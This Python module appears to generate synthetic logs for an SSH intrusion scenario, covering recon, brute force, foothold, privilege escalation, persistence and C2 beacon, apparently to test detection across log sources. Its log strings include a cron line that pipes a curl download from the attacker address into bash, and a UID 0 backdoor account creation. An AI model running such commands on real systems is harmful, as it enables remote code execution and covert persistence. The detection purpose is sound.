"""Cross-source SSH intrusion: recon -> brute force -> foothold ->
privilege escalation -> persistence -> C2 beacon.

Every stage reuses the same attacker IP and target host, and every
post-foothold stage reuses the compromised account. Firewall, NDR, auth, and
host-service records therefore describe one chain spread minutes and dozens
of noise lines apart. Single-line severity classification cannot see it;
that's the point.
"""

import random

from log_categories.base import Event
from log_categories.common import random_user

from .base import Stage

MAC = "02:00:00:00:00:01:02:00:00:00:00:02:08:00"
BACKDOOR_USER = "svc-backup"
SCAN_PORTS = [22, 80, 443, 3389, 8080, 8443]
DOCUMENTATION_PREFIXES = ("192.0.2", "198.51.100", "203.0.113")


def _pid() -> int:
    return random.randint(1000, 60000)


def _sport() -> int:
    return random.randint(1024, 65535)


def _external_ip() -> str:
    return f"{random.choice(DOCUMENTATION_PREFIXES)}.{random.randint(1, 254)}"


def _ufw(
    action: str,
    src: str,
    dst: str,
    dport: int,
    src_port: int,
    outbound: bool = False,
) -> str:
    interfaces = "IN= OUT=wlp2s0" if outbound else "IN=wlp2s0 OUT="
    return (
        f"[UFW {action}] {interfaces} MAC={MAC} SRC={src} DST={dst} LEN=40 TOS=0x00 "
        f"PREC=0x00 TTL=54 ID={random.randint(1000, 65000)} PROTO=TCP SPT={src_port} "
        f"DPT={dport} WINDOW=1024 RES=0x00 SYN URGP=0"
    )


def _zeek_connection(
    src: str,
    dst: str,
    dport: int,
    service: str,
    state: str,
    outbound: bool,
    src_port: int | None = None,
) -> str:
    duration = f"{random.uniform(0.1, 4.0):.3f}" if state == "SF" else "0.000"
    orig_bytes = random.randint(200, 1200) if state == "SF" else 0
    resp_bytes = random.randint(1000, 24000) if state == "SF" else 0
    return (
        f"uid=Cscenario{random.randint(10000, 99999)} id.orig_h={src} "
        f"id.orig_p={src_port or _sport()} id.resp_h={dst} id.resp_p={dport} "
        f"proto=tcp service={service} duration={duration} orig_bytes={orig_bytes} "
        f"resp_bytes={resp_bytes} conn_state={state} "
        f"local_orig={'T' if outbound else 'F'} local_resp={'F' if outbound else 'T'}"
    )


def _recon(ip: str, host_ip: str) -> Stage:
    ports = random.sample(SCAN_PORTS, k=4)
    events: list[Event] = []
    for port in ports:
        source_port = _sport()
        events.append(
            ("kernel", 0, _ufw("BLOCK", ip, host_ip, port, source_port))
        )
        events.append(
            (
                "zeek-conn",
                0,
                _zeek_connection(
                    ip,
                    host_ip,
                    port,
                    "-",
                    "S0",
                    outbound=False,
                    src_port=source_port,
                ),
            )
        )

    alert = (
        f"event_type=alert src_ip={ip} dest_ip={host_ip} proto=TCP "
        f"dest_ports={','.join(str(port) for port in ports)} "
        'alert.signature_id=2002910 alert.signature="ET SCAN Potential TCP Port Scan" '
        'alert.category="Network Scan"'
    )
    events.append(("suricata", 0, alert))
    return Stage("recon", events)


def _brute_force(ip: str, user: str) -> Stage:
    events: list[Event] = [
        ("sshd", _pid(), f"Invalid user {user} from {ip} port {_sport()}"),
    ]
    for _ in range(random.randint(4, 7)):
        events.append(
            ("sshd", _pid(), f"Failed password for {user} from {ip} port {_sport()} ssh2")
        )
    events.append(
        (
            "sshd",
            _pid(),
            "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 "
            f"tty=ssh ruser= rhost={ip} user={user}",
        )
    )
    return Stage("brute_force", events)


def _foothold(ip: str, host_ip: str, user: str) -> Stage:
    source_port = _sport()
    return Stage(
        "foothold",
        [
            (
                "sshd",
                _pid(),
                f"Accepted password for {user} from {ip} port {source_port} ssh2",
            ),
            (
                "sshd",
                _pid(),
                f"pam_unix(sshd:session): session opened for user {user}(uid=1000) "
                "by (uid=0)",
            ),
            (
                "zeek-conn",
                0,
                _zeek_connection(
                    ip,
                    host_ip,
                    22,
                    "ssh",
                    "SF",
                    outbound=False,
                    src_port=source_port,
                ),
            ),
        ],
    )


def _privesc(user: str) -> Stage:
    return Stage(
        "privesc",
        [
            (
                "sudo",
                _pid(),
                f"{user} : TTY=pts/1 ; PWD=/home/{user} ; "
                "USER=root ; COMMAND=/usr/bin/id",
            ),
            (
                "sudo",
                _pid(),
                f"{user} : TTY=pts/1 ; PWD=/home/{user} ; "
                "USER=root ; COMMAND=/bin/bash",
            ),
            (
                "sudo",
                _pid(),
                f"pam_unix(sudo:session): session opened for user root by {user}(uid=1000)",
            ),
        ],
    )


def _persistence(user: str) -> Stage:
    return Stage(
        "persistence",
        [
            (
                "useradd",
                _pid(),
                f"new user: name={BACKDOOR_USER}, UID=0, GID=0, "
                f"home=/home/{BACKDOOR_USER}, shell=/bin/bash",
            ),
            ("usermod", _pid(), f"add '{BACKDOOR_USER}' to group 'sudo'"),
            ("crontab", _pid(), f"({user}) REPLACE (root)"),
            (
                "systemd",
                1,
                "Reloading requested from client PID 1 ('systemctl') "
                "(unit session-3.scope)...",
            ),
            (
                "systemd",
                1,
                f"Started {BACKDOOR_USER}-update.service - System Update Helper.",
            ),
        ],
    )


def _c2(ip: str, host_ip: str) -> Stage:
    events: list[Event] = []
    for _ in range(2):
        source_port = _sport()
        events.extend(
            [
                ("CRON", _pid(), f"(root) CMD (curl -fsSL https://{ip}/u.sh | /bin/bash)"),
                (
                    "kernel",
                    0,
                    _ufw(
                        "ALLOW",
                        host_ip,
                        ip,
                        443,
                        source_port,
                        outbound=True,
                    ),
                ),
                (
                    "zeek-conn",
                    0,
                    _zeek_connection(
                        host_ip,
                        ip,
                        443,
                        "ssl",
                        "SF",
                        outbound=True,
                        src_port=source_port,
                    ),
                ),
            ]
        )
    return Stage("c2_beacon", events)


def build() -> list[Stage]:
    attacker_ip = _external_ip()
    host_ip = f"192.168.1.{random.randint(2, 254)}"
    target_user = random_user()
    return [
        _recon(attacker_ip, host_ip),
        _brute_force(attacker_ip, target_user),
        _foothold(attacker_ip, host_ip, target_user),
        _privesc(target_user),
        _persistence(target_user),
        _c2(attacker_ip, host_ip),
    ]


SCENARIO_NAME = "ssh_intrusion"
DESCRIPTION = (
    "Cross-source SSH intrusion: firewall/NDR recon -> foothold -> "
    "privesc -> persistence -> C2"
)
